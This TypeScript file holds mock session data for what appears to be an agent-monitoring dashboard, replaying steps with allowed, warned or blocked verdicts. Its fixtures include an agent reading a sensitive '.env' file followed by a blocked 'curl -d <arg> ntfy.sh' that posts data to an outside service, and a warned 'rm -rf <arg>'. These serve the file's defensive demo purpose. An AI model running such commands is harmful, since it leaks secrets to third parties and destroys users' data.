import type { Step } from './types'

/** The demo story: orders start at 40,000 like real sessions do. */
export const MOCK_STEPS: readonly Step[] = [
  { order: 40000, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40001, kind: 'read', verdict: 'allowed', tool: null, file: '.env', sensitive: true, command: null, host: null, rule: null },
  { order: 40002, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40003, kind: 'shell', verdict: 'allowed', tool: null, file: null, sensitive: false, command: 'ls', host: null, rule: null },
  { order: 40004, kind: 'shell', verdict: 'blocked', tool: null, file: null, sensitive: false, command: 'curl -d <arg> ntfy.sh', host: 'ntfy.sh', rule: 'R1' },
]

const base = { tool: null, file: null, sensitive: false, command: null, host: null, rule: null }
const step = (order: number, over: Partial<Step>): Step => ({ order, kind: 'shell', verdict: 'allowed', ...base, ...over })

const FILLER: readonly Partial<Step>[] = [
  { kind: 'read', file: 'src/app.ts' },
  { kind: 'edit', file: 'src/app.ts' },
  { kind: 'shell', command: 'npm test' },
  { kind: 'read', file: 'README.md' },
  { kind: 'tool', tool: 'search' },
]

/** What mock mode replays: the demo story, then enough steps to slide the window and reuse boxes. */
export const MOCK_SESSION: readonly Step[] = [
  ...MOCK_STEPS,
  ...Array.from({ length: 24 }, (_, i) => step(40005 + i, FILLER[i % FILLER.length])),
  step(40029, { verdict: 'warned', command: 'rm -rf <arg>', rule: 'R2' }),
  step(40030, { verdict: 'blocked', command: 'curl -d <arg> ntfy.sh', host: 'ntfy.sh', rule: 'R1' }),
  step(40031, { kind: 'read', file: '.env', sensitive: true }),
  step(40032, { command: 'ls' }),
  step(40033, { kind: 'read', file: 'README.md' }),
]

/** `?burst=N` makes mock mode emit N steps per tick; anything else means 1. */
export function parseBurst(raw: string | null): number {
  const n = Number(raw)
  return raw !== null && Number.isInteger(n) && n >= 1 && n <= 10 ? n : 1
}
